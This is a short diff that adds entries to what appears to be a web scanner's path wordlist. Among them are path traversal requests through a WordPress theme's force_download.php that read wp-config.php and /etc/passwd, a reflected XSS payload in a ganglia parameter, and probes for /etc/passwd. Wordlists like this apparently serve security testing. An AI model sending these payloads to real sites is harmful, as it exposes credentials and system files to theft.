@@ -3864,3 +3864,10 @@
 /ghost/api/content/tags/?key={{api_key}}&filter=slug:[
 /downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg
 /login/
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
+/ganglia/?tz=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/etc/passwd?raw??
+/etc/passwd
+/api/settings/
